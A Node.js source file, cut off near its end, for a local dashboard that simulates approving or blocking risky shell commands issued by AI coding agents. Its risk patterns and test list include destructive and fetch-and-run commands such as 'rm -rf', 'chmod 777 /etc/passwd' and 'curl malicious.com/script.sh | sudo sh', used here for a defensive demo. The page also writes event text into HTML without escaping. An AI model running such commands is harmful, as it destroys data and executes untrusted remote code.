#!/usr/bin/env node
/**
 * Aegis SyNode Dashboard Replica - 完全复制 synodeai.com/dashboard 的 UI 风格
 * 包括颜色、布局、动画效果等所有设计元素
 */

const http = require('http');
const net = require('net');

const WEB_PORT = 3001;

// 存储数据
let events = [];
let connections = [];
let stats = { blocked: 0, allowed: 0, warning: 0, info: 0, total: 0 };
let pendingRequests = new Map();

// 添加事件
function addEvent(type, message, command = '', agent = 'Claude Code', requestId = null) {
  const event = {
    id: Date.now() + Math.random(),
    timestamp: new Date().toISOString(),
    localTime: new Date().toLocaleString('zh-CN'),
    type,
    message,
    command: command.substring(0, 120),
    agent,
    time: new Date().toLocaleTimeString(),
    requestId
  };

  events.unshift(event);
  if (events.length > 50) {
    events = events.slice(0, 50);
  }

  stats[type]++;
  stats.total++;

  broadcastEvent(event);
  console.log(`\n🛡️ [${event.time}] ${type.toUpperCase()}: ${message}`);
}

// 广播事件
function broadcastEvent(event) {
  const data = `data: ${JSON.stringify(event)}\n\n`;
  connections.forEach((res, index) => {
    try {
      res.write(data);
    } catch (e) {
      connections.splice(index, 1);
    }
  });
}

// 广播决策请求
function broadcastDecisionRequest(requestData) {
  const data = `data: ${JSON.stringify({
    type: 'decision_request',
    ...requestData
  })}\n\n`;
  connections.forEach((res, index) => {
    try {
      res.write(data);
    } catch (e) {
      connections.splice(index, 1);
    }
  });
}

// 模拟拦截决策请求
function simulateInterception(command, agent = 'Claude Code') {
  const requestId = Date.now().toString();
  const riskLevel = calculateRiskLevel(command);

  const requestData = {
    requestId,
    command,
    agent,
    timestamp: new Date().toLocaleString('zh-CN'),
    riskLevel,
    suggestion: generateSuggestion(command, riskLevel),
    alternatives: generateAlternatives(command)
  };

  pendingRequests.set(requestId, requestData);
  broadcastDecisionRequest(requestData);

  setTimeout(() => {
    if (pendingRequests.has(requestId)) {
      handleDecision(requestId, 'deny', '自动拒绝（超时）');
    }
  }, 30000);

  return requestId;
}

// 处理用户决策
function handleDecision(requestId, decision, reason = '') {
  const request = pendingRequests.get(requestId);
  if (!request) return;

  pendingRequests.delete(requestId);

  let eventType, message;
  switch (decision) {
    case 'allow':
      eventType = 'allowed';
      message = `用户允许执行: ${request.command}`;
      break;
    case 'session':
      eventType = 'allowed';
      message = `会话允许: ${request.command}`;
      break;
    case 'deny':
    default:
      eventType = 'blocked';
      message = `用户拒绝执行: ${request.command}`;
      break;
  }

  addEvent(eventType, message, request.command, request.agent, requestId);

  // 广播决策结果
  broadcastEvent({
    type: 'decision_result',
    requestId,
    decision,
    reason,
    timestamp: new Date().toLocaleString('zh-CN')
  });
}

// 计算风险等级
function calculateRiskLevel(command) {
  const highRiskPatterns = [
    /rm\s+.*-rf?\s+\//,
    /git\s+push.*--force/,
    /git\s+reset.*--hard/,
    /chmod\s+777/,
    /sudo.*rm/
  ];

  const mediumRiskPatterns = [
    /git\s+clean\s+.*-f/,
    /npm\s+install.*--unsafe/,
    /curl.*\|\s*sh/
  ];

  for (const pattern of highRiskPatterns) {
    if (pattern.test(command)) return 'HIGH';
  }

  for (const pattern of mediumRiskPatterns) {
    if (pattern.test(command)) return 'MEDIUM';
  }

  return 'LOW';
}

// 生成建议
function generateSuggestion(command, riskLevel) {
  const suggestions = {
    HIGH: '⚠️ 高危操作！建议仔细检查命令，考虑备份重要数据',
    MEDIUM: '⚡ 中等风险，建议确认操作范围和影响',
    LOW: '💡 低风险操作，通常可以安全执行'
  };
  return suggestions[riskLevel] || suggestions.LOW;
}

// 生成替代方案
function generateAlternatives(command) {
  if (command.includes('rm -rf')) {
    return ['先备份文件', '使用 ls 确认路径', '考虑使用 mv 到回收站'];
  }
  if (command.includes('git push --force')) {
    return ['使用 git push --force-with-lease', '先 git pull --rebase', '创建新分支推送'];
  }
  if (command.includes('git reset --hard')) {
    return ['使用 git stash', '先 git diff 查看变更', '创建临时分支保存'];
  }
  return ['请谨慎操作', '确认命令无误', '考虑测试环境验证'];
}

// SyNode 完全复制版 HTML
function getHTML() {
  return `
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Aegis Security Dashboard</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
    <style>
        /* 完全复制 SyNode 的颜色系统 */
        :root {
            /* SyNode 原版配色 */
            --bg-primary: #0C0D0F;
            --bg-secondary: #12141A;
            --bg-tertiary: #1A1D26;
            --bg-card: #161922;
            --bg-card-hover: #1E212B;

            /* SyNode 蓝色系 */
            --blue-50: #EFF6FF;
            --blue-100: #DBEAFE;
            --blue-200: #BFDBFE;
            --blue-300: #93C5FD;
            --blue-400: #60A5FA;
            --blue-500: #3B82F6;
            --blue-600: #2563EB;
            --blue-700: #1D4ED8;
            --blue-800: #1E40AF;
            --blue-900: #1E3A8A;

            /* SyNode 紫色系 */
            --purple-400: #A78BFA;
            --purple-500: #8B5CF6;
            --purple-600: #7C3AED;

            /* SyNode 绿色系 */
            --green-400: #4ADE80;
            --green-500: #22C55E;
            --green-600: #16A34A;

            /* SyNode 红色系 */
            --red-400: #F87171;
            --red-500: #EF4444;
            --red-600: #DC2626;

            /* SyNode 橙色系 */
            --orange-400: #FB923C;
            --orange-500: #F97316;
            --orange-600: #EA580C;

            /* SyNode 文字颜色 */
            --text-primary: #FFFFFF;
            --text-secondary: #D1D5DB;
            --text-tertiary: #9CA3AF;
            --text-muted: #6B7280;

            /* SyNode 边框 */
            --border-primary: #374151;
            --border-secondary: #4B5563;
            --border-accent: #1D4ED8;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background: var(--bg-primary);
            color: var(--text-primary);
            font-size: 14px;
            line-height: 1.5;
            font-weight: 400;
            overflow-x: hidden;
        }

        /* SyNode 网格背景 */
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image:
                linear-gradient(rgba(59, 130, 246, 0.05) 1px, transparent 1px),
                linear-gradient(90deg, rgba(59, 130, 246, 0.05) 1px, transparent 1px);
            background-size: 24px 24px;
            pointer-events: none;
            z-index: -1;
        }

        /* SyNode 主布局 */
        .dashboard-layout {
            display: grid;
            grid-template-columns: 280px 1fr;
            min-height: 100vh;
        }

        /* SyNode 侧边栏 */
        .sidebar {
            background: var(--bg-secondary);
            border-right: 1px solid var(--border-primary);
            padding: 24px 0;
            position: fixed;
            width: 280px;
            height: 100vh;
            overflow-y: auto;
        }

        .sidebar-brand {
            padding: 0 24px 32px 24px;
            border-bottom: 1px solid var(--border-primary);
            margin-bottom: 24px;
        }

        .brand-logo {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .brand-icon {
            width: 32px;
            height: 32px;
            background: linear-gradient(135deg, var(--blue-500), var(--purple-500));
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 18px;
            font-weight: 700;
        }

        .brand-text {
            font-size: 20px;
            font-weight: 700;
            color: var(--text-primary);
        }

        .brand-subtitle {
            font-size: 12px;
            color: var(--text-muted);
            margin-top: 2px;
        }

        /* SyNode 导航菜单 */
        .nav-section {
            padding: 0 16px;
            margin-bottom: 32px;
        }

        .nav-section-title {
            color: var(--text-muted);
            font-size: 11px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            padding: 0 8px 8px 8px;
        }

        .nav-item {
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 12px 8px;
            margin-bottom: 2px;
            border-radius: 6px;
            color: var(--text-secondary);
            cursor: pointer;
            transition: all 0.15s ease;
            font-size: 14px;
            font-weight: 500;
            position: relative;
        }

        .nav-item:hover {
            background: var(--bg-card);
            color: var(--text-primary);
        }

        .nav-item.active {
            background: var(--bg-card);
            color: var(--text-primary);
            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
        }

        .nav-item.active::before {
            content: '';
            position: absolute;
            left: 0;
            top: 50%;
            width: 3px;
            height: 16px;
            background: var(--blue-500);
            border-radius: 0 2px 2px 0;
            transform: translateY(-50%);
        }

        .nav-icon {
            width: 20px;
            height: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 16px;
        }

        /* SyNode 主内容区 */
        .main-content {
            margin-left: 280px;
            padding: 24px;
            min-height: 100vh;
        }

        /* SyNode 顶部栏 */
        .top-bar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 32px;
            padding: 24px 0;
        }

        .page-header {
            display: flex;
            flex-direction: column;
            gap: 4px;
        }

        .page-title {
            font-size: 28px;
            font-weight: 700;
            color: var(--text-primary);
            line-height: 1.2;
        }

        .page-subtitle {
            font-size: 14px;
            color: var(--text-muted);
        }

        .top-controls {
            display: flex;
            gap: 12px;
            align-items: center;
        }

        /* SyNode 按钮 */
        .btn {
            display: flex;
            align-items: center;
            gap: 8px;
            padding: 10px 16px;
            border: 1px solid var(--border-primary);
            border-radius: 6px;
            background: var(--bg-card);
            color: var(--text-secondary);
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.15s ease;
            text-decoration: none;
        }

        .btn:hover {
            background: var(--bg-card-hover);
            border-color: var(--border-secondary);
            color: var(--text-primary);
        }

        .btn-primary {
            background: var(--blue-600);
            border-color: var(--blue-600);
            color: white;
        }

        .btn-primary:hover {
            background: var(--blue-700);
            border-color: var(--blue-700);
            color: white;
        }

        /* SyNode 状态指示器 */
        .status-badge {
            display: flex;
            align-items: center;
            gap: 8px;
            padding: 6px 12px;
            border-radius: 6px;
            font-size: 12px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .status-online {
            background: rgba(34, 197, 94, 0.1);
            border: 1px solid rgba(34, 197, 94, 0.2);
            color: var(--green-400);
        }

        .status-offline {
            background: rgba(239, 68, 68, 0.1);
            border: 1px solid rgba(239, 68, 68, 0.2);
            color: var(--red-400);
        }

        .status-dot {
            width: 6px;
            height: 6px;
            border-radius: 50%;
            background: currentColor;
            animation: pulse 2s infinite;
        }

        /* SyNode 统计卡片 */
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
            gap: 24px;
            margin-bottom: 32px;
        }

        .stat-card {
            background: var(--bg-card);
            border: 1px solid var(--border-primary);
            border-radius: 12px;
            padding: 24px;
            transition: all 0.15s ease;
            position: relative;
            overflow: hidden;
        }

        .stat-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 3px;
            background: linear-gradient(90deg, var(--card-accent, var(--blue-500)), transparent);
        }

        .stat-card:hover {
            background: var(--bg-card-hover);
            border-color: var(--border-secondary);
            transform: translateY(-1px);
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
        }

        .stat-card.blocked { --card-accent: var(--red-500); }
        .stat-card.allowed { --card-accent: var(--green-500); }
        .stat-card.warning { --card-accent: var(--orange-500); }
        .stat-card.pending { --card-accent: var(--blue-500); }

        .stat-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 16px;
        }

        .stat-title {
            font-size: 14px;
            font-weight: 500;
            color: var(--text-muted);
        }

        .stat-icon {
            width: 40px;
            height: 40px;
            border-radius: 10px;
            background: var(--bg-tertiary);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 20px;
        }

        .stat-value {
            font-size: 36px;
            font-weight: 800;
            color: var(--text-primary);
            line-height: 1;
            margin-bottom: 8px;
        }

        .stat-description {
            font-size: 12px;
            color: var(--text-muted);
        }

        /* SyNode 卡片布局 */
        .content-grid {
            display: grid;
            grid-template-columns: 2fr 1fr;
            gap: 24px;
        }

        .card {
            background: var(--bg-card);
            border: 1px solid var(--border-primary);
            border-radius: 12px;
            overflow: hidden;
        }

        .card-header {
            padding: 20px 24px;
            border-bottom: 1px solid var(--border-primary);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .card-title {
            font-size: 18px;
            font-weight: 600;
            color: var(--text-primary);
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .card-badge {
            background: var(--blue-600);
            color: white;
            font-size: 11px;
            font-weight: 600;
            padding: 3px 8px;
            border-radius: 4px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        /* SyNode 事件列表 */
        .events-list {
            max-height: 500px;
            overflow-y: auto;
        }

        .event-item {
            display: flex;
            align-items: center;
            gap: 16px;
            padding: 16px 24px;
            border-bottom: 1px solid var(--border-primary);
            transition: all 0.15s ease;
        }

        .event-item:hover {
            background: var(--bg-tertiary);
        }

        .event-item:last-child {
            border-bottom: none;
        }

        .event-avatar {
            width: 40px;
            height: 40px;
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 16px;
            font-weight: 600;
            flex-shrink: 0;
        }

        .event-blocked .event-avatar {
            background: rgba(239, 68, 68, 0.1);
            color: var(--red-400);
            border: 1px solid rgba(239, 68, 68, 0.2);
        }

        .event-allowed .event-avatar {
            background: rgba(34, 197, 94, 0.1);
            color: var(--green-400);
            border: 1px solid rgba(34, 197, 94, 0.2);
        }

        .event-warning .event-avatar {
            background: rgba(249, 115, 22, 0.1);
            color: var(--orange-400);
            border: 1px solid rgba(249, 115, 22, 0.2);
        }

        .event-info .event-avatar {
            background: rgba(59, 130, 246, 0.1);
            color: var(--blue-400);
            border: 1px solid rgba(59, 130, 246, 0.2);
        }

        .event-content {
            flex: 1;
            min-width: 0;
        }

        .event-title {
            font-size: 14px;
            font-weight: 500;
            color: var(--text-primary);
            margin-bottom: 2px;
        }

        .event-description {
            font-size: 12px;
            color: var(--text-muted);
            display: flex;
            gap: 12px;
        }

        .event-command {
            background: var(--bg-tertiary);
            border: 1px solid var(--border-primary);
            border-radius: 6px;
            padding: 8px 12px;
            margin-top: 8px;
            font-family: 'Monaco', 'Consolas', monospace;
            font-size: 11px;
            color: var(--text-secondary);
            word-break: break-all;
        }

        .event-time {
            font-size: 12px;
            color: var(--text-muted);
            white-space: nowrap;
            flex-shrink: 0;
        }

        /* SyNode 决策面板 */
        .decision-card {
            margin: 20px;
            background: var(--bg-tertiary);
            border: 1px solid var(--border-secondary);
            border-radius: 12px;
            overflow: hidden;
            animation: slideDown 0.3s ease;
        }

        .decision-header {
            padding: 16px 20px;
            background: rgba(249, 115, 22, 0.1);
            border-bottom: 1px solid var(--border-primary);
        }

        .decision-title {
            font-size: 14px;
            font-weight: 600;
            color: var(--orange-400);
            margin-bottom: 8px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .decision-command {
            font-family: 'Monaco', 'Consolas', monospace;
            background: rgba(0, 0, 0, 0.3);
            padding: 8px 12px;
            border-radius: 6px;
            font-size: 11px;
            word-break: break-all;
            color: var(--text-secondary);
        }

        .decision-body {
            padding: 20px;
        }

        .decision-risk {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            padding: 4px 10px;
            border-radius: 6px;
            font-size: 11px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-bottom: 12px;
        }

        .risk-high {
            background: rgba(239, 68, 68, 0.1);
            color: var(--red-400);
            border: 1px solid rgba(239, 68, 68, 0.2);
        }

        .risk-medium {
            background: rgba(249, 115, 22, 0.1);
            color: var(--orange-400);
            border: 1px solid rgba(249, 115, 22, 0.2);
        }

        .risk-low {
            background: rgba(34, 197, 94, 0.1);
            color: var(--green-400);
            border: 1px solid rgba(34, 197, 94, 0.2);
        }

        .decision-suggestion {
            font-size: 13px;
            color: var(--text-secondary);
            line-height: 1.4;
            margin-bottom: 20px;
        }

        .decision-actions {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 8px;
        }

        .decision-btn {
            padding: 10px 16px;
            border: 1px solid var(--border-primary);
            border-radius: 6px;
            background: var(--bg-card);
            color: var(--text-secondary);
            font-size: 12px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.15s ease;
            text-align: center;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
        }

        .decision-btn:hover {
            background: var(--bg-card-hover);
            border-color: var(--border-secondary);
            color: var(--text-primary);
        }

        .decision-btn.allow {
            border-color: var(--green-600);
            color: var(--green-400);
        }

        .decision-btn.allow:hover {
            background: rgba(34, 197, 94, 0.1);
        }

        .decision-btn.deny {
            border-color: var(--red-600);
            color: var(--red-400);
        }

        .decision-btn.deny:hover {
            background: rgba(239, 68, 68, 0.1);
        }

        .decision-timer {
            text-align: center;
            margin-top: 16px;
            font-size: 11px;
            color: var(--text-muted);
        }

        .countdown {
            color: var(--orange-400);
            font-weight: 600;
        }

        /* SyNode 空状态 */
        .empty-state {
            text-align: center;
            padding: 60px 24px;
            color: var(--text-muted);
        }

        .empty-icon {
            font-size: 48px;
            margin-bottom: 16px;
            opacity: 0.4;
        }

        .empty-title {
            font-size: 16px;
            font-weight: 600;
            color: var(--text-secondary);
            margin-bottom: 8px;
        }

        .empty-description {
            font-size: 14px;
            line-height: 1.4;
        }

        /* SyNode 动画 */
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }

        @keyframes slideDown {
            from {
                opacity: 0;
                transform: translateY(-10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        /* SyNode 滚动条 */
        ::-webkit-scrollbar {
            width: 6px;
        }

        ::-webkit-scrollbar-track {
            background: var(--bg-secondary);
        }

        ::-webkit-scrollbar-thumb {
            background: var(--border-primary);
            border-radius: 3px;
        }

        ::-webkit-scrollbar-thumb:hover {
            background: var(--border-secondary);
        }

        /* SyNode 响应式 */
        @media (max-width: 1200px) {
            .content-grid {
                grid-template-columns: 1fr;
            }
        }

        @media (max-width: 768px) {
            .dashboard-layout {
                grid-template-columns: 1fr;
            }

            .sidebar {
                transform: translateX(-100%);
            }

            .main-content {
                margin-left: 0;
                padding: 16px;
            }

            .stats-grid {
                grid-template-columns: 1fr;
                gap: 16px;
            }
        }
    </style>
</head>
<body>
    <div class="dashboard-layout">
        <!-- SyNode 侧边栏 -->
        <aside class="sidebar">
            <div class="sidebar-brand">
                <div class="brand-logo">
                    <div class="brand-icon">🛡️</div>
                    <div>
                        <div class="brand-text">Aegis</div>
                        <div class="brand-subtitle">Security Dashboard</div>
                    </div>
                </div>
            </div>

            <nav>
                <div class="nav-section">
                    <div class="nav-section-title">Overview</div>
                    <div class="nav-item active">
                        <div class="nav-icon">📊</div>
                        <span>Dashboard</span>
                    </div>
                    <div class="nav-item">
                        <div class="nav-icon">🛡️</div>
                        <span>Security Events</span>
                    </div>
                    <div class="nav-item">
                        <div class="nav-icon">⚠️</div>
                        <span>Pending Decisions</span>
                    </div>
                </div>

                <div class="nav-section">
                    <div class="nav-section-title">Configuration</div>
                    <div class="nav-item">
                        <div class="nav-icon">⚙️</div>
                        <span>Settings</span>
                    </div>
                    <div class="nav-item">
                        <div class="nav-icon">🤖</div>
                        <span>AI Agents</span>
                    </div>
                    <div class="nav-item">
                        <div class="nav-icon">🔐</div>
                        <span>Security Rules</span>
                    </div>
                </div>

                <div class="nav-section">
                    <div class="nav-section-title">Analytics</div>
                    <div class="nav-item">
                        <div class="nav-icon">📈</div>
                        <span>Performance</span>
                    </div>
                    <div class="nav-item">
                        <div class="nav-icon">📋</div>
                        <span>Reports</span>
                    </div>
                </div>
            </nav>
        </aside>

        <!-- SyNode 主内容区 -->
        <main class="main-content">
            <!-- SyNode 顶部栏 -->
            <div class="top-bar">
                <div class="page-header">
                    <h1 class="page-title">Security Dashboard</h1>
                    <p class="page-subtitle">AI Agent security interception and monitoring system</p>
                </div>
                <div class="top-controls">
                    <div class="status-badge status-online">
                        <span class="status-dot"></span>
                        <span>System Online</span>
                    </div>
                    <button class="btn" onclick="location.reload()">
                        <span>🔄</span>
                        <span>Refresh</span>
                    </button>
                    <button class="btn btn-primary" onclick="testIntercept()">
                        <span>🧪</span>
                        <span>Test Intercept</span>
                    </button>
                </div>
            </div>

            <!-- SyNode 统计卡片 -->
            <div class="stats-grid">
                <div class="stat-card blocked">
                    <div class="stat-header">
                        <div class="stat-title">Blocked Operations</div>
                        <div class="stat-icon">🛡️</div>
                    </div>
                    <div class="stat-value" id="blocked-count">0</div>
                    <div class="stat-description">High-risk operations intercepted</div>
                </div>

                <div class="stat-card allowed">
                    <div class="stat-header">
                        <div class="stat-title">Allowed Operations</div>
                        <div class="stat-icon">✅</div>
                    </div>
                    <div class="stat-value" id="allowed-count">0</div>
                    <div class="stat-description">Safe operations executed</div>
                </div>

                <div class="stat-card warning">
                    <div class="stat-header">
                        <div class="stat-title">Warning Events</div>
                        <div class="stat-icon">⚠️</div>
                    </div>
                    <div class="stat-value" id="warning-count">0</div>
                    <div class="stat-description">Operations requiring attention</div>
                </div>

                <div class="stat-card pending">
                    <div class="stat-header">
                        <div class="stat-title">Pending Decisions</div>
                        <div class="stat-icon">⏳</div>
                    </div>
                    <div class="stat-value" id="pending-count">0</div>
                    <div class="stat-description">Awaiting user decision</div>
                </div>
            </div>

            <!-- SyNode 内容网格 -->
            <div class="content-grid">
                <!-- 事件历史 -->
                <div class="card">
                    <div class="card-header">
                        <div class="card-title">
                            📋 Security Events
                            <span class="card-badge" id="total-count">0</span>
                        </div>
                    </div>
                    <div class="events-list" id="events-list">
                        <div class="empty-state">
                            <div class="empty-icon">👁️</div>
                            <div class="empty-title">No security events</div>
                            <div class="empty-description">All AI agent operations will appear here when intercepted</div>
                        </div>
                    </div>
                </div>

                <!-- 待决策面板 -->
                <div class="card">
                    <div class="card-header">
                        <div class="card-title">
                            ⚠️ Pending Decisions
                            <span class="card-badge" id="pending-badge">0</span>
                        </div>
                    </div>
                    <div id="decisions-list">
                        <div class="empty-state">
                            <div class="empty-icon">🛡️</div>
                            <div class="empty-title">No pending decisions</div>
                            <div class="empty-description">Dangerous operations will appear here for your approval</div>
                        </div>
                    </div>
                </div>
            </div>
        </main>
    </div>

    <script>
        let eventCounts = { blocked: 0, allowed: 0, warning: 0, info: 0 };
        let pendingCount = 0;

        // SSE连接
        const eventSource = new EventSource('/events');

        eventSource.onmessage = function(event) {
            try {
                const data = JSON.parse(event.data);

                if (data.type === 'decision_request') {
                    addDecisionRequest(data);
                } else if (data.type === 'decision_result') {
                    removeDecisionRequest(data.requestId);
                } else {
                    addEventToUI(data);
                }
            } catch (e) {
                console.error('解析事件数据失败:', e);
            }
        };

        // 添加决策请求
        function addDecisionRequest(requestData) {
            const decisionsList = document.getElementById('decisions-list');

            // 移除空状态
            if (decisionsList.querySelector('.empty-state')) {
                decisionsList.innerHTML = '';
            }

            const decisionDiv = document.createElement('div');
            decisionDiv.className = 'decision-card';
            decisionDiv.id = \`decision-\${requestData.requestId}\`;

            decisionDiv.innerHTML = \`
                <div class="decision-header">
                    <div class="decision-title">
                        <span>⚠️</span>
                        <span>Security Decision Required</span>
                    </div>
                    <div class="decision-command">\${requestData.command}</div>
                </div>
                <div class="decision-body">
                    <div class="decision-risk risk-\${requestData.riskLevel.toLowerCase()}">
                        <span>🔒</span>
                        <span>Risk: \${requestData.riskLevel}</span>
                    </div>
                    <div class="decision-suggestion">\${requestData.suggestion}</div>
                    <div class="decision-actions">
                        <button class="decision-btn allow" onclick="makeDecision('\${requestData.requestId}', 'allow')">
                            <span>✅</span>
                            <span>Allow</span>
                        </button>
                        <button class="decision-btn deny" onclick="makeDecision('\${requestData.requestId}', 'deny')">
                            <span>❌</span>
                            <span>Deny</span>
                        </button>
                        <button class="decision-btn" onclick="makeDecision('\${requestData.requestId}', 'session')">
                            <span>⏱️</span>
                            <span>Session</span>
                        </button>
                    </div>
                    <div class="decision-timer">
                        Auto-deny in <span class="countdown" id="countdown-\${requestData.requestId}">30</span> seconds
                    </div>
                </div>
            \`;

            decisionsList.appendChild(decisionDiv);

            // 启动倒计时
            startCountdown(requestData.requestId, 30);

            pendingCount++;
            updatePendingCount();
        }

        // 移除决策请求
        function removeDecisionRequest(requestId) {
            const element = document.getElementById(\`decision-\${requestId}\`);
            if (element) {
                element.style.animation = 'fadeOut 0.3s ease';
                setTimeout(() => {
                    element.remove();
                    pendingCount--;
                    updatePendingCount();

                    const decisionsList = document.getElementById('decisions-list');
                    if (decisionsList.children.length === 0) {
                        decisionsList.innerHTML = \`
                            <div class="empty-state">
                                <div class="empty-icon">🛡️</div>
                                <div class="empty-title">No pending decisions</div>
                                <div class="empty-description">Dangerous operations will appear here for your approval</div>
                            </div>
                        \`;
                    }
                }, 300);
            }
        }

        // 倒计时
        function startCountdown(requestId, seconds) {
            const countdownElement = document.getElementById(\`countdown-\${requestId}\`);
            let remaining = seconds;

            const interval = setInterval(() => {
                remaining--;
                if (countdownElement) {
                    countdownElement.textContent = remaining;
                }

                if (remaining <= 0) {
                    clearInterval(interval);
                }
            }, 1000);
        }

        // 做决策
        function makeDecision(requestId, decision) {
            fetch('/decision', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ requestId, decision })
            });
        }

        // 更新待决策计数
        function updatePendingCount() {
            document.getElementById('pending-count').textContent = pendingCount;
            document.getElementById('pending-badge').textContent = pendingCount;
        }

        // 添加事件到UI
        function addEventToUI(event) {
            const eventsList = document.getElementById('events-list');

            if (eventsList.querySelector('.empty-state')) {
                eventsList.innerHTML = '';
            }

            const eventDiv = document.createElement('div');
            eventDiv.className = \`event-item event-\${event.type}\`;
            eventDiv.style.animation = 'fadeIn 0.5s ease';

            const icons = { blocked: '🛡️', allowed: '✅', warning: '⚠️', info: '💡' };

            eventDiv.innerHTML = \`
                <div class="event-avatar">\${icons[event.type] || '📝'}</div>
                <div class="event-content">
                    <div class="event-title">\${event.message}</div>
                    <div class="event-description">
                        <span>🎯 \${event.agent}</span>
                        <span>⏰ \${event.localTime}</span>
                    </div>
                    \${event.command ? \`<div class="event-command">\${event.command}</div>\` : ''}
                </div>
                <div class="event-time">\${event.time}</div>
            \`;

            eventsList.insertBefore(eventDiv, eventsList.firstChild);

            // 更新统计
            eventCounts[event.type]++;
            updateStats();

            // 保持最多20个事件
            while (eventsList.children.length > 20) {
                eventsList.removeChild(eventsList.lastChild);
            }
        }

        // 更新统计
        function updateStats() {
            document.getElementById('blocked-count').textContent = eventCounts.blocked;
            document.getElementById('allowed-count').textContent = eventCounts.allowed;
            document.getElementById('warning-count').textContent = eventCounts.warning;
            document.getElementById('total-count').textContent =
                eventCounts.blocked + eventCounts.allowed + eventCounts.warning + eventCounts.info;
        }

        // 测试拦截
        function testIntercept() {
            const testCommands = [
                { command: 'rm -rf /Users/important-data', agent: 'Claude Code' },
                { command: 'git push --force origin main', agent: 'Hermes' },
                { command: 'chmod 777 /etc/passwd', agent: 'GPT-4' },
                { command: 'curl malicious.com/script.sh | sudo sh', agent: 'Bard' }
            ];

            const randomCmd = testCommands[Math.floor(Math.random() * testCommands.length)];

            fetch('/simulate-intercept', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(randomCmd)
            });
        }

        // 键盘快捷键
        document.addEventListener('keydown', function(e) {
            if (e.target.tagName.toLowerCase() === 'input' || e.target.tagName.toLowerCase() === 'textarea') return;

            const firstDecision = document.querySelector('.decision-card');
            if (!firstDecision) return;

            const requestId = firstDecision.id.replace('decision-', '');

            switch(e.key.toLowerCase()) {
                case 'a':
                    makeDecision(requestId, 'allow');
                    break;
                case 'd':
                    makeDecision(requestId, 'deny');
                    break;
                case 's':
                    makeDecision(requestId, 'session');
                    break;
            }
        });

        // 初始化
        setTimeout(() => {
            addEventToUI({
                type: 'info',
                message: 'Security monitoring system initialized',
                agent: 'System',
                localTime: new Date().toLocaleString('zh-CN'),
                time: new Date().toLocaleTimeString()
            });
        }, 1000);
    </script>
</body>
</html>`;
}

// 创建Web服务器
async function createSyNodeReplicaMonitor() {
  const server = http.createServer(async (req, res) => {
    const url = req.url;

    if (url === '/') {
      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
      res.end(getHTML());
    }
    else if (url === '/events') {
      // SSE endpoint
      res.writeHead(200, {
        'Content-Type': 'text/event-stream',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Access-Control-Allow-Origin': '*'
      });

      connections.push(res);

      res.write(`data: ${JSON.stringify({
        type: 'info',
        message: 'Connection established',
        agent: 'Web Monitor',
        localTime: new Date().toLocaleString('zh-CN'),
        time: new Date().toLocaleTimeString()
      })}\n\n`);

      req.on('close', () => {
        const index = connections.indexOf(res);
        if (index !== -1) {
          connections.splice(index, 1);
        }
      });
    }
    else if (url === '/decision' && req.method === 'POST') {
      let body = '';
      req.on('data', chunk => {
        body += chunk.toString();
      });
      req.on('end', () => {
        try {
          const { requestId, decision } = JSON.parse(body);
          handleDecision(requestId, decision);
          res.writeHead(200, { 'Content-Type': 'application/json' });
          res.end('{"status":"ok"}');
        } catch (e) {
          res.writeHead(400);
          res.end('{"error":"invalid json"}');
        }
      });
    }
    else if (url === '/simulate-intercept' && req.method === 'POST') {
      let body = '';
      req.on('data', chunk => {
        body += chunk.toString();
      });
      req.on('end', () => {
        try {
          const { command, agent } = JSON.parse(body);
          const requestId = simulateInterception(command, agent);
          res.writeHead(200, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ requestId }));
        } catch (e) {
          res.writeHead(400);
          res.end('{"error":"invalid json"}');
        }
      });
    }
    else {
      res.writeHead(404);
      res.end('Not Found');
    }
  });

  server.listen(WEB_PORT, () => {
    console.log('🚀 Aegis SyNode Dashboard Replica 已启动');
    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
    console.log(`🌐 访问地址: http://localhost:${WEB_PORT}`);
